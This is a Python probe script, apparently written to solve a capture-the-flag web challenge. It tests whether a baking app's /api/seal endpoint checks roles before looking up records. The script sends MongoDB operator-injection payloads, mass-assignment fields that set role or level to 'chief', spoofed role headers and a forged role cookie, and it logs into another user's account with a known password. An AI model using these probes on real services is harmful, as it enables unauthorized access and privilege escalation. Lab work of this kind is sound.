#!/usr/bin/env python3
"""Where does /api/seal decide? Ordering tells us what is even reachable.

The previous run of this challenge rejected /api/seal with 403 and concluded "needs a
staff row in the DB", but it probed the body as `id`, while mixer.js actually sends
`recipeId`. So the mass-assignment tests may never have touched the handler at all.

Two questions, cheaply:
  1. Does the role check run before the lookup? Compare a valid id, a nonexistent id,
     and a Mongo-operator object. Identical 403 for all three = role gate first, and the
     body is irrelevant until we have privileges. Different answers = the lookup runs.
  2. Is the level taken from the request at all (level/seal/kind/tier/... = "chief")?
Also re-reads the earlier batch to see how slowly the shared worker actually seals.
"""
import json
import sys
import time

from cc import Client, new_baker, save, submit


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


RID = "fbe4d95a5a0d3e20630328fe"     # from capture_review.py, owned by mx5997

u, c, r = new_baker("sl")
w("user %s" % u)
code, rec, _ = save(c, "seal ordering probe", [{"name": "sugar", "value": "1"}])
rid = rec.get("id")
w("fresh recipe %s (other id for cross checks)" % rid)
w(submit(c, rid)[:2])

# keep the mx5997 session alive by re-logging
c2 = Client()
c2.post("/login", {"username": "mx5997", "password": "Passw0rd!"})

TESTS = [
    ("valid own id", {"recipeId": rid}),
    ("nonexistent id", {"recipeId": "000000000000000000000000"}),
    ("empty body", {}),
    ("other user's id", {"recipeId": RID}),
    ("operator $ne", {"recipeId": {"$ne": "zz"}}),
    ("operator $exists", {"recipeId": {"$exists": True}}),
    ("operator $gt ''", {"recipeId": {"$gt": ""}}),
    ("operator $regex", {"recipeId": {"$regex": "."}}),
    ("id field not recipeId", {"id": rid}),
    ("level chief too", {"recipeId": rid, "level": "chief"}),
    ("seal chief too", {"recipeId": rid, "seal": "chief"}),
    ("kind gold too", {"recipeId": rid, "kind": "gold", "tier": "chief",
                       "grade": "chief", "stamp": "chief"}),
    ("role chief body", {"recipeId": rid, "role": "chief"}),
    ("username chief", {"recipeId": rid, "username": "chief", "user": "chief"}),
]
w("=== /api/seal as a baker ===")
for label, body in TESTS:
    code, out, dt = c.post("/api/seal", body)
    w("  %-22s -> %s %.2fs %r" % (label, code, dt, str(out)[:110]))
    time.sleep(0.45)

w("=== same tests with X-Role / Authorization extras (role from header?) ===")
for h in [{"X-Role": "chief"}, {"X-Inspector": "1"}, {"Authorization": "Bearer chief"},
          {"Cookie": None}]:
    if h.get("Cookie") is None:
        cc = Client(); cc.post("/login", {"username": u, "password": "Passw0rd!"})
        cc.jar["role"] = "chief"
        code, out, dt = cc.post("/api/seal", {"recipeId": rid})
        w("  role cookie=chief      -> %s %r" % (code, str(out)[:90]))
    else:
        code, out, dt = c.post("/api/seal", {"recipeId": rid}, headers=h)
        w("  %-24s -> %s %r" % (list(h)[0], code, str(out)[:90]))
    time.sleep(0.45)

w("=== status of both batches now ===")
for who, cc, batch in (("me", c, rid), ("mx5997", c2, RID)):
    code, page, dt = cc.get("/review/%s" % batch)
    txt = page if isinstance(page, str) else json.dumps(page)
    import re
    w("  %s %s status=%s seal=%s flag=%s" % (
        who, batch,
        re.findall(r"queued|reviewing|reviewed|draft", txt)[:3],
        re.findall(r"chief|golden|standard", txt, re.I)[:3],
        bool(re.search(r"class=\"flag\"|sun\{", txt))))
    time.sleep(0.4)
